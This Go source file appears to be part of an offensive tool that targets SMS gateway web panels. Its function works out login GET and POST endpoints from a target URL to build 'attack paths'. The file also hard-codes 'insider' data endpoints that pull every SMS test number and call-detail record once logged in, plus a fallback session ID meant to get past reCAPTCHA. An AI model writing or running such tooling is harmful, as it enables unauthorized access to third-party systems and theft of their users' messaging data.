package main

import (
	"net/url"
	"strings"
)

// DetectSmartPaths analyzes the target URL and generates the most effective attack paths.
func DetectSmartPaths(rawURL string) *SmartPaths {
	u, err := url.Parse(rawURL)
	if err != nil {
		return &SmartPaths{
			LoginGET:  rawURL,
			LoginPOST: rawURL,
		}
	}

	baseURL := u.Scheme + "://" + u.Host
	urlPath := strings.Trim(u.Path, "/")

	// Find action
	lastSlash := strings.LastIndex(urlPath, "/")
	var basePrefix, action string
	if lastSlash >= 0 {
		basePrefix = "/" + urlPath[:lastSlash]
		action = urlPath[lastSlash+1:]
	} else {
		basePrefix = ""
		action = urlPath
	}

	// Determine POST endpoint based on GET action
	actionLower := strings.ToLower(action)
	postAction := action // default same
	switch {
	case actionLower == "signin":
		// Zone SMS style: SignIn (GET) → signmein (POST)
		postAction = "signmein"
	case actionLower == "login":
		// IMS SMS style: login (GET) → signin (POST)
		postAction = "signin"
	case actionLower == "signmein":
		postAction = "signmein"
	}

	paths := &SmartPaths{
		LoginGET:    rawURL,
		LoginPOST:   rawURL,
		Dashboard:   baseURL,
		Profile:     baseURL,
		CSRFEnabled: false,
		CSRFToken:   "etkk",
		SessionID:   "",
	}

	if basePrefix != "" {
		paths.LoginGET  = baseURL + basePrefix + "/" + action
		paths.LoginPOST = baseURL + basePrefix + "/" + postAction
	} else {
		paths.LoginGET  = baseURL + "/" + action
		paths.LoginPOST = baseURL + "/" + postAction
	}

	paths.Dashboard = baseURL + basePrefix + "/agent/"
	paths.Profile   = baseURL + basePrefix + "/agent/"

	return paths
}

// Insider Endpoints — used by L3 when authenticated
var InsiderEndpoints = []string{
	"/agent/res/data_smstestnumbers.php?frange=&fclient=&sEcho=2&iColumns=5&sColumns=%2C%2C%2C%2C&iDisplayStart=0&iDisplayLength=-1&mDataProp_0=0&sSearch_0=&bRegex_0=false&bSearchable_0=true&bSortable_0=true&mDataProp_1=1&sSearch_1=&bRegex_1=false&bSearchable_1=true&bSortable_1=true&mDataProp_2=2&sSearch_2=&bRegex_2=false&bSearchable_2=true&bSortable_2=true&mDataProp_3=3&sSearch_3=&bRegex_3=false&bSearchable_3=true&bSortable_3=true&mDataProp_4=4&sSearch_4=&bRegex_4=false&bSearchable_4=true&bSortable_4=true&sSearch=&bRegex=false&iSortCol_0=0&sSortDir_0=asc&iSortingCols=1&_=%d",
	"/agent/res/data_testsmscdr.php?sEcho=2&iColumns=5&sColumns=%2C%2C%2C%2C&iDisplayStart=0&iDisplayLength=-1&mDataProp_0=0&sSearch_0=&bRegex_0=false&bSearchable_0=true&bSortable_0=true&mDataProp_1=1&sSearch_1=&bRegex_1=false&bSearchable_1=true&bSortable_1=true&mDataProp_2=2&sSearch_2=&bRegex_2=false&bSearchable_2=true&bSortable_2=true&mDataProp_3=3&sSearch_3=&bRegex_3=false&bSearchable_3=true&bSortable_3=true&mDataProp_4=4&sSearch_4=&bRegex_4=false&bSearchable_4=true&bSortable_4=true&sSearch=&bRegex=false&iSortCol_0=0&sSortDir_0=desc&iSortingCols=1&_=%d",
}

// Fallback session for IMS SMS (used when reCAPTCHA is present)
var FallbackSessionID = "h5jr60aritpo5uqpkvp8983l1a"
